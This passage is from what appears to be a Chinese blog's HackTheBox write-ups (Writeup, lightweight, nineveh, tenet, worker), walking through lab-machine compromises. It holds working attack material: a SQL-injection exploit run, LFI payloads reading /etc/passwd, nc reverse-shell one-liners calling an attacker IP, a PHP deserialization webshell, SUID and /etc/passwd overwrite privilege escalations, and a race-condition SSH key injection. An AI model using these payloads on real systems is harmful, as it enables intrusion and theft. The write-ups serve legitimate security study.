<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">svn co http:&#x2F;&#x2F;svn.cmsmadesimple.org&#x2F;svn&#x2F;cmsmadesimple&#x2F;trunk</span><br></pre></td></tr></table></figure>

<p>在这之后发现了CHANGELOG.txt，里面存有版本信息</p>
<p><img src="/images/Writeup/6.png" alt="6"></p>
<p>尝试查看该网站的，得到版本2.2.9.1</p>
<p><img src="/images/Writeup/7.png" alt="7"></p>
<p>这可以帮助我们定位到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CMS Made Simple &lt; 2.2.10 - SQL Injection                             | php&#x2F;webapps&#x2F;46635.py</span><br></pre></td></tr></table></figure>

<p>查看该脚本，它利用了sql时间注入获取凭据，可以得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python 46635.py -u http:&#x2F;&#x2F;10.10.10.138&#x2F;writeup&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Writeup/8.png" alt="8"></p>
<p>和平常不一样，密码是32位应该是md5，但这里有盐</p>
<p>破解它有点棘手，正常来说可能需要代码审计，不过幸运的是，这里的python脚本提供了破解功能，虽然它破解很慢，但是我们知道了破解的逻辑</p>
<p><img src="/images/Writeup/9.png" alt="9"></p>
<p>这表示哈希的格式应该是<code>md5($salt.$pass)</code></p>
<p>破解加盐的哈希，这次得使用hashcat了，首先查看hash格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat --example-hashes |more</span><br></pre></td></tr></table></figure>

<p>得到Mode 20</p>
<p><img src="/images/Writeup/10.png" alt="10"></p>
<p>开始破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;62def4866937f08cc13bab43bb14e6f7:5a599ef579066807&#39; &gt; hash</span><br><span class="line">hashcat -a 0 -m 20 hash &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Writeup/11.png" alt="11"></p>
<p>得到密码<code>raykayjay9</code>，尝试ssh</p>
<p><img src="/images/Writeup/12.png" alt="12"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用linpeas通过颜色可以很快发现，当前用户出于<code>staff</code>组，这意味着我们对<code>/usr/local</code>可写，具体参考<a href="https://wiki.debian.org/SystemGroups">链接</a></p>
<p><img src="/images/Writeup/14.png" alt="14"></p>
<p>注意这里的目录权限可写，但是不可读，也就没法列举文件</p>
<p><img src="/images/Writeup/16.png" alt="16"></p>
<p>可写会造成PATH劫持</p>
<p><img src="/images/Writeup/13.png" alt="13"></p>
<p>比如ssh登录的时候会以root执行<code>run-parts</code></p>
<p><img src="/images/Writeup/15.png" alt="15"></p>
<p>而<code>/etc/update-motd.d/10-uname</code>又执行了<code>uname</code>，不理解可以参考<a href="http://manpages.ubuntu.com/manpages/xenial/man5/update-motd.5.html">链接</a>，通常有3个文件值得注意</p>
<p>所以我们有两个命令可以劫持，这里随便选哪个都一样。这里如果写反弹shell，注意格式<code>#!/bin/bash</code>，别被sh(dash)坑了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;chmod +s &#x2F;bin&#x2F;bash&#39; &gt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;uname</span><br><span class="line">chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;uname</span><br></pre></td></tr></table></figure>

<p>之后再开一个会话ssh登录过去即可</p>
<p><img src="/images/Writeup/17.png" alt="17"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:lightweight</title>
    <url>/2020/06/30/HTB-lightweight/</url>
    <content><![CDATA[<h1 id="lightweight"><a href="#lightweight" class="headerlink" title="lightweight"></a>lightweight</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/lightweight/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>先对ldap进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 389 --script ldap-search 10.10.10.119</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ldapsearch -x -h 10.10.10.119 -s base namingcontexts</span><br><span class="line">ldapsearch -x -h 10.10.10.119 -b &quot;dc&#x3D;lightweight,dc&#x3D;htb&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/lightweight/2.jpg" alt="2"></p>
<p><img src="/images/lightweight/3.jpg" alt="3"></p>
<p>确实枚举出了一些信息，如密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2Roai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv</span><br><span class="line">e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdmszYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x</span><br></pre></td></tr></table></figure>

<p>base64解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;crypt&#125;$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE&#x2F;g&#x2F;Z&#x2F;7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA.&#x2F;44&#x2F;</span><br><span class="line">&#123;crypt&#125;$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX&#x2F;QEfjdRQzgn1</span><br></pre></td></tr></table></figure>

<p>放到<code>hash-identifier</code>中发现为SHA-256，使用hashcat进行破解，没有解出来</p>
<p>尝试在web中发掘信息<br>这次无法运行目录扫描，会被ban ip</p>
<p>在info和user页面获得了一些提示</p>
<p><img src="/images/lightweight/4.jpg" alt="4"></p>
<p><img src="/images/lightweight/5.jpg" alt="5"></p>
<p>告诉我们可以用我们的ip进行ssh登录</p>
<p><img src="/images/lightweight/6.jpg" alt="6"></p>
<p>成功登录</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/lightweight/7.jpg" alt="7"></p>
<p>我们发现tcpdump添加两个Capabilities，具体功能参考<a href="https://blog.csdn.net/alex_yangchuansheng/article/details/102796001">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CAP_NET_ADMIN:允许执行网络管理任务</span><br><span class="line">CAP_NET_RAW:允许使用原始套接字</span><br></pre></td></tr></table></figure>

<p>所以接下来，在对方机器使用tcpdump监听389端口，需要指定网口为环回口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -i lo port 389 -w capture.cap -v</span><br></pre></td></tr></table></figure>

<p>之后访问ldap创建账号的页面<code>http://10.10.10.119/info.php</code>这样会调用ldap</p>
<p><img src="/images/lightweight/8.jpg" alt="8"></p>
<p>访问的同时，显示抓到了包，之后把包给传过来</p>
<p><img src="/images/lightweight/9.jpg" alt="9"></p>
<p>成功获取密码</p>
<p><img src="/images/lightweight/10.jpg" alt="10"></p>
<p>成功切换用户</p>
<p><img src="/images/lightweight/11.jpg" alt="11"></p>
<p>在目录发现了backup文件，传过来看看</p>
<p>压缩包存在密码，进行破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install libcompress-raw-lzma-perl</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;john&#x2F;7z2john.pl backup.7z</span><br><span class="line">john --format&#x3D;7z hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/lightweight/12.jpg" alt="12"></p>
<p>破解出密码<code>delete</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7z x backup.7z</span><br><span class="line">delete</span><br></pre></td></tr></table></figure>

<p><img src="/images/lightweight/13.jpg" alt="13"></p>
<p>接着在解压后的<code>stats.php</code>发现了用户<code>ldapuser1</code>的密码，切换ldapuser1</p>
<p><img src="/images/lightweight/14.jpg" alt="14"></p>
<p>发现openssl的capabilites设置为ep<br>这代表该程序只可以做任何事情</p>
<p><img src="/images/lightweight/15.jpg" alt="15"></p>
<p>不过需要注意，这里的openssl不在环境变量，环境变量的openssl不具有ep，所以需要指定路径进行调用</p>
<p>之后我们可以利用openssl的高权限读写完成提权</p>
<p><img src="/images/lightweight/16.jpg" alt="16"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;openssl enc -in &#x2F;etc&#x2F;passwd &gt; passwd</span><br><span class="line">vi passwd </span><br><span class="line">cat passwd | .&#x2F;openssl enc -out &#x2F;etc&#x2F;passwd</span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>什么方法都可以，passwd改已有密码用户id，添加新用户，sudoers改权限，shadow改root密码</p>
<p>最重要的是，openssl读取高权限文件后生成的文件，我们具有rw权限</p>
<p><img src="/images/lightweight/17.jpg" alt="17"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:nineveh</title>
    <url>/2020/06/16/HTB-nineveh/</url>
    <content><![CDATA[<h1 id="nineveh"><a href="#nineveh" class="headerlink" title="nineveh"></a>nineveh</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/nineveh/1.jpg" alt="1"></p>
<p>开放了两个web服务，http和https</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>http和https首页都没有额外发现，也没有额外链接，所以先进行目录枚举</p>
<p><img src="/images/nineveh/2.jpg" alt="2"></p>
<p>在80端口，发现了文件夹<code>department</code></p>
<p><img src="/images/nineveh/3.jpg" alt="3"></p>
<p>发现是一个登录页面，这个登录页面有利于我们暴力破解<br>如果输入账户例如admin，页面提示Invalid Password!说明用户存在<br>如果输入用户abcdef，页面提示invalid username说明用户不存在</p>
<p>所以我们可以针对以获取的用户名admin进行暴力破解</p>
<p><img src="/images/nineveh/4.jpg" alt="4"></p>
<p>之后就可以获取用户名/密码 <code>admin/1q2w3e4r5t</code></p>
<p><img src="/images/nineveh/5.jpg" alt="5"></p>
<p>以admin登录进入，发现似乎也没有有价值的信息，不过url<code>manage.php?notes=files/ninevehNotes.txt</code>后面的txt很像文件包含<br>经测试，确实存在文件包含payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.43&#x2F;department&#x2F;manage.php?notes&#x3D;files&#x2F;ninevehNotes..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>仔细研究后发现，这个文件包含漏洞，必须包含ninevehNotes关键字，才可以生效，如下payload也是可以的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">notes&#x3D;?ninevehNotes..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/images/nineveh/6.jpg" alt="6"></p>
<p>可以发现用户amrois是可以登录bash的<br>至此很难再有其他发现了</p>
<p>之后我选择扫描443端口的目录</p>
<p><img src="/images/nineveh/7.jpg" alt="7"></p>
<p>扫描出了目录db，尝试访问</p>
<p><img src="/images/nineveh/8.jpg" alt="8"></p>
<p>只好再次尝试暴力破解<br>得出密码password123</p>
<p><img src="/images/nineveh/9.jpg" alt="9"></p>
<p>登录之后是web应用phpLiteAdminv1.9</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="phpLiteAdmin"><a href="#phpLiteAdmin" class="headerlink" title="phpLiteAdmin"></a>phpLiteAdmin</h3><p>搜索公开漏洞</p>
<p><img src="/images/nineveh/10.jpg" alt="10"></p>
<p>攻击者创建php扩展名的数据库，再插入php恶意代码到数据表字段内，之后访问数据库文件即可触发恶意代码<br>我们已经拥有可以触发本地访问的LFI漏洞 ，所以我们创建的数据库得存在字符串<code>ninevehNotes</code>才行</p>
<p>我们创建数据库ninevehNotes.php<br>页面已经提供了文件的位置<br>再创建表，表名和序号随便写</p>
<p><img src="/images/nineveh/11.jpg" alt="11"></p>
<p>payload选用如下，尝试过msfvenom生成的payload，不过会因为单引号的问题报错，所以我的这个payload没有问题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.173 4444 &gt;&#x2F;tmp&#x2F;f&quot;); ?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/nineveh/12.jpg" alt="12"></p>
<p>payload插在<code>Filed</code>或者<code>Default Value</code>都可以，Type选Text</p>
<p>之后再使用文件包含触发php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.43&#x2F;department&#x2F;manage.php?notes&#x3D;&#x2F;var&#x2F;tmp&#x2F;ninevehNotes.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/nineveh/13.jpg" alt="13"></p>
<p>成功getshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="cronjob"><a href="#cronjob" class="headerlink" title="cronjob"></a>cronjob</h3><p>尝试使用linpeas进行提权，不过一无所获</p>
<p>不过在<code>/report</code>目录下我有所发现</p>
<p><img src="/images/nineveh/14.jpg" alt="14"></p>
<p>这看起来是一个cronjob，我想找出这个进程是什么</p>
<p>使用pspy进行寻找</p>
<p><img src="/images/nineveh/15.jpg" alt="15"></p>
<p>似乎发现了这个进程，名叫chkrootkit</p>
<p>寻找公开漏洞</p>
<p><img src="/images/nineveh/16.jpg" alt="16"></p>
<p>发现了权限提升</p>
<p><img src="/images/nineveh/17.jpg" alt="17"></p>
<p>利用方法是在tmp目录下创建可执行文件，名为update<br>之后等待chrootkit去执行就行</p>
<p>update的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">rm &#x2F;tmp&#x2F;ff;mkfifo &#x2F;tmp&#x2F;ff;cat &#x2F;tmp&#x2F;ff|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.16.173 5555 &gt;&#x2F;tmp&#x2F;ff</span><br></pre></td></tr></table></figure>

<p><img src="/images/nineveh/18.jpg" alt="18"></p>
<p>最后获取root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:tenet</title>
    <url>/2021/01/17/HTB-tenet/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>添加host</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.129.34.56  tenet.htb</span><br></pre></td></tr></table></figure>

<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/tenet/1.png" alt="1"></p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>目录枚举发现了wordpress，但之后没有什么有意思的信息</p>
<p>在留言板处得到了提示</p>
<p><img src="/images/tenet/2.png" alt="2"></p>
<p>提示了存在备份文件，sator.php</p>
<p>尝试访问<code>http://tenet.htb/sator.php</code>或者<code>http://tenet.htb/sator.php.bak</code>但都不存在</p>
<p>稍微卡了一会儿后，我尝试不携带host直接ip访问</p>
<p><code>http://10.129.34.56/sator.php</code></p>
<p><img src="/images/tenet/3.png" alt="3"></p>
<p><code>10.129.34.56/sator.php.bak</code></p>
<p><img src="/images/tenet/4.png" alt="4"></p>
<p>发现了备份文件，源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DatabaseExport</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $user_file = <span class="string">&#x27;users.txt&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> $data = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_db</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;[+] Grabbing users from text file &lt;br&gt;&#x27;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt; data = <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		file_put_contents(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> . <span class="keyword">$this</span> -&gt;user_file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;[] Database updated &lt;br&gt;&#x27;</span>;</span><br><span class="line">	<span class="comment">//	echo &#x27;Gotta get this working properly...&#x27;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input = $_GET[<span class="string">&#x27;arepo&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$databaseupdate = unserialize($input);</span><br><span class="line"></span><br><span class="line">$app = <span class="keyword">new</span> DatabaseExport;</span><br><span class="line">$app -&gt; update_db();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>这里只要得到了源码，就非常好办了，一眼就能看出是一个php反序列化漏洞，代码的危害是会造成任意文件上传，这里的反序列化漏洞比较基础</p>
<p>我们可以直接构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class DatabaseExport</span><br><span class="line">&#123;</span><br><span class="line">    public $user_file&#x3D;&#39;shell.php&#39;;</span><br><span class="line">    public $data&#x3D;&quot;&lt;?php phpinfo();system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot;;		&#x2F;&#x2F;最好外部用&quot;，内部用&#39;</span><br><span class="line">&#125;</span><br><span class="line">$payload&#x3D;new DatabaseExport;</span><br><span class="line">echo serialize($payload);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/tenet/5.png" alt="5"></p>
<p>最后去源代码里查看，就可以得到payload了</p>
<p>根据泄露的代码，获取提交参数，然后去提交，这里序列化代码不需要url编码也行</p>
<p>payload:<code>10.129.34.56/sator.php?arepo=O:14:&quot;DatabaseExport&quot;:2:&#123;s:9:&quot;user_file&quot;;s:9:&quot;shell.php&quot;;s:4:&quot;data&quot;;s:40:&quot;&lt;?php phpinfo();system($_GET[&#39;cmd&#39;]); ?&gt;&quot;;&#125;</code></p>
<p><img src="/images/tenet/6.png" alt="6"></p>
<p>看来文件上传成功了</p>
<p><img src="/images/tenet/7.png" alt="7"></p>
<p>成功解析，然后就可以得到初始的shell了</p>
<p><img src="/images/tenet/8.png" alt="8"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>读取wordpress的wp-config.php获取mysql连接密码</p>
<p><img src="/images/tenet/9.png" alt="9"></p>
<p>发现了<code>neil/Opera2112</code></p>
<p>主机当中确实存在neil用户，尝试密码复用，直接切换到他，成功获取user权限</p>
<p><img src="/images/tenet/10.png" alt="10"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>发现可以sudo运行的shell脚本</p>
<p><img src="/images/tenet/11.png" alt="11"></p>
<p>内容如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">checkAdded() &#123;</span><br><span class="line"></span><br><span class="line">sshName=$(/bin/echo $key | /usr/bin/cut -d &quot; &quot; -f 3)</span><br><span class="line"></span><br><span class="line">if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then</span><br><span class="line"></span><br><span class="line">        /bin/echo &quot;Successfully added $sshName to authorized_keys file!&quot;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">        /bin/echo &quot;Error in adding $sshName to authorized_keys file!&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">checkFile() &#123;</span><br><span class="line"></span><br><span class="line">if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then</span><br><span class="line"></span><br><span class="line">        /bin/echo &quot;Error in creating key file!&quot;</span><br><span class="line"></span><br><span class="line">        if [[ -f $1 ]]; then /bin/rm $1; fi</span><br><span class="line"></span><br><span class="line">        exit 1</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addKey() &#123;</span><br><span class="line"></span><br><span class="line">tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)</span><br><span class="line"></span><br><span class="line">(umask 110; touch $tmpName)</span><br><span class="line"></span><br><span class="line">/bin/echo $key &gt;&gt;$tmpName</span><br><span class="line"></span><br><span class="line">checkFile $tmpName</span><br><span class="line"></span><br><span class="line">/bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">/bin/rm $tmpName</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key=&quot;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&quot;</span><br><span class="line">addKey</span><br><span class="line">checkAdded</span><br></pre></td></tr></table></figure>

<p>执行这个脚本，会将root的公钥写入类似这样的文件名<code>/tmp/ssh-keg6vGnD，/tmp/ssh-qZqnZ71z，/tmp/ssh-wiiBg6iw</code>的临时文件中，之后会将上一步临时文件里的公钥提取出来，追加到<code>/root/.ssh/authorized_keys</code>，最后删除临时文件</p>
<p>这里<strong>创建临时文件并将公钥写入</strong>到<strong>读取临时文件里的公钥写入authorized_keys</strong>中间有一系列if判断，存在时间差，存在条件竞争race condition，利用这点，我们可以将自己的公钥写入到root的authorized_keys中</p>
<p>现在本地生成密钥对</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">cat &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>将自己的公钥写入到目标机器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTH8WyZ4QrzjoYZI56Tf7Vr2Hmejz24L2hzCELhrLIN5qCumZcpdfiBuKKgKMX&#x2F;xstZ4tBomYHdANP+iq&#x2F;gZZ1A8zo0s+AlLgh3s12PsjwOobe0ARest&#x2F;K7p5+P1qFWOzXKnDGjeV+QbBlAk8m87yhkEm0jEDLlBwF3Yh9yFucMoTiWDk7xjDp5lq+Hj8Db+OSx5DMSJnqLdaYxLMWxZeWzfyAM+iZByqWlpzJ5H4KwMgs393YGxrc4r+7TO68jk3QyPp&#x2F;IOGWa2XTYxCUl4ipvHKUgVrAsDuI22ABrLkGu0GejEvhDlg1gBAaDlt4ye5CH1TsSEz6SV+tlbMznqw3bwvcuT1qfNcRMWxvhF9Ued8ceSDonElkRUfOedmw5c8rAHTNhhMHK0PHQMuq0Ht8PxJ7aQlt&#x2F;ztPgSlk0dEyB+Vy74udIyevhBPRQNSPXAc39dGxnTlT30r2bFNOskSQ+V3ws34lcD6HEZ1967vRwxDK5NXOTXuHmnYgfSBOLGk&#x3D; root@kali&quot; &gt; &#x2F;home&#x2F;neil&#x2F;key</span><br></pre></td></tr></table></figure>

<p>之后建立两个ssh连接，在第一个ssh连接中，运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for ((i&#x3D;0;i&lt;2;)) ;do cat &#x2F;home&#x2F;neil&#x2F;key |tee &#x2F;tmp&#x2F;ssh-* ;done</span><br></pre></td></tr></table></figure>

<p>不断的将密钥写入到<code>ssh-*</code>这种格式的文件中</p>
<p>第二个ssh中，sudo运行该脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while true;do sudo &#x2F;usr&#x2F;local&#x2F;bin&#x2F;enableSSH.sh;done</span><br></pre></td></tr></table></figure>

<p>有个坑，用tee配合管道进行通配符写入会好一些，重定向和通配符好像会造成歧义重定向</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">neil@tenet:&#x2F;tmp$ cat &#x2F;home&#x2F;neil&#x2F;key &gt; &#x2F;tmp&#x2F;ssh-*</span><br><span class="line">-bash: &#x2F;tmp&#x2F;ssh-*: ambiguous redirect</span><br></pre></td></tr></table></figure>

<p>等待一段时间，就可以直接登录root了</p>
<p><img src="/images/tenet/12.png" alt="12"></p>
<p>最后看看竞争的文件，发现只写了几十个，就完成了提权</p>
<p><img src="/images/tenet/13.png" alt="13"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:worker</title>
    <url>/2021/02/02/HTB-worker/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/worker/1.png" alt="1"></p>
<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>80端口web页面没有什么发现 </p>
<p>svn服务存在未授权访问，可以对它枚举，但我没接触过这个服务，找到了相关的cheat sheet</p>
<p><a href="https://www.perforce.com/blog/vcs/svn-commands-cheat-sheet">https://www.perforce.com/blog/vcs/svn-commands-cheat-sheet</a></p>
<p><a href="https://blog.csdn.net/gsg8709/article/details/79435741">https://blog.csdn.net/gsg8709/article/details/79435741</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">svn ls svn:&#x2F;&#x2F;10.10.10.203			#查看仓库下的文件名</span><br><span class="line">svn log svn:&#x2F;&#x2F;10.10.10.203			#查看日志</span><br><span class="line">svn checkout svn:&#x2F;&#x2F;10.10.10.203		#下载仓库文件</span><br></pre></td></tr></table></figure>

<p>其中的文件有</p>
<p><img src="/images/worker/2.png" alt="2"></p>
<p>大致是说该仓库不再维护，最新版本放在了<a href="http://devops.worker.htb/">http://devops.worker.htb</a></p>
<p>把主机名添加到hosts里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.203	devops.worker.htb dimension.worker.htb worker.htb</span><br></pre></td></tr></table></figure>

<p>访问发现需要凭据</p>
<p><img src="/images/worker/3.png" alt="3"></p>
<p>尝试访问另一个发现的地址<code>dimension.worker.htb</code></p>
<p><img src="/images/worker/4.png" alt="4"></p>
<p>其中work页面又有去多指向别的主机名的地址</p>
<p><img src="/images/worker/5.png" alt="5"></p>
<p>把它抓取下来，放到hosts里</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;dimension.worker.htb&#x2F;\#work -s|grep -o &quot;http:&#x2F;&#x2F;.*htb&quot; |awk -F &quot;&#x2F;&#x2F;&quot; &#39;&#123;print $2&#125;&#39;</span><br><span class="line">curl -s 安静模式，关闭进度条</span><br><span class="line">grep -o 只显示匹配部分</span><br></pre></td></tr></table></figure>

<p>hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.10.10.203	devops.worker.htb dimension.worker.htb worker.htb alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb</span><br></pre></td></tr></table></figure>

<p>之后页面是能访问了，但全部都是坑，不过好在靶机环境，大部分都是死链，不会陷的太久</p>
